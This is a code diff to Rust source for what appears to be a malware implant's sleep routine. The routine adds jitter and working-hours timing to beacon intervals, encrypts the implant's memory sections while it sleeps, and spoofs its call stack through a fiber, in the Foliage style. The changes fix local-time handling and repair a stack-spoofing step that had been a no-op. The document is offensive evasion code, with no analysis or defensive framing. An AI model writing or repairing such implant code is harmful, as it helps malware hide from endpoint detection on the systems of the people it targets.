@@ -15,12 +15,39 @@ pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
         config.working_hours_end,
         config.off_hours_multiplier,
     ) {
-        let now = (std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap()
-            .as_secs()
-            / 3600
-            % 24) as u32;
+        let now: u32 = {
+            // Use local time for working-hours comparison, not UTC.
+            #[cfg(unix)]
+            {
+                let secs = std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs() as libc::time_t;
+                unsafe {
+                    let lt = libc::localtime(&secs);
+                    if lt.is_null() {
+                        (secs / 3600 % 24) as u32
+                    } else {
+                        (*lt).tm_hour as u32
+                    }
+                }
+            }
+            #[cfg(windows)]
+            {
+                let mut st: winapi::um::minwinbase::SYSTEMTIME = unsafe { std::mem::zeroed() };
+                unsafe { winapi::um::sysinfoapi::GetLocalTime(&mut st) };
+                st.wHour as u32
+            }
+            #[cfg(not(any(unix, windows)))]
+            {
+                (std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs()
+                    / 3600
+                    % 24) as u32
+            }
+        };
         if now < start || now >= end {
             base *= mult as f64;
             debug!("Applying off-hours sleep multiplier: {}", mult);
@@ -47,6 +74,9 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
                 // Foliage uses NtDelayExecution
 
                 crypto::encrypt_sections();
+                // Populate SLEEP_DURATION_NS before switching to the sleep fiber
+                // so the fiber knows how long to sleep (was always 0 before = no-op spoof).
+                spoof::SLEEP_DURATION_NS.with(|c| c.set(duration.as_nanos() as u64));
                 spoof::spoof_stack();
 
                 let duration_100ns = -(duration.as_nanos() as i64 / 100);
@@ -70,6 +100,7 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
                         std::mem::transmute(addr);
                     function(0, &mut delay as *mut i64);
                     spoof::restore_stack();
+                    spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
                     crypto::decrypt_sections();
                 } // close if !addr.is_null()
             } // close unsafe
@@ -440,7 +471,7 @@ pub mod spoof {
             const { std::cell::Cell::new(std::ptr::null_mut()) };
         pub(super) static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
             const { std::cell::Cell::new(std::ptr::null_mut()) };
-        static SLEEP_DURATION_NS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
+        pub(super) static SLEEP_DURATION_NS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
     }
 
     #[cfg(windows)]
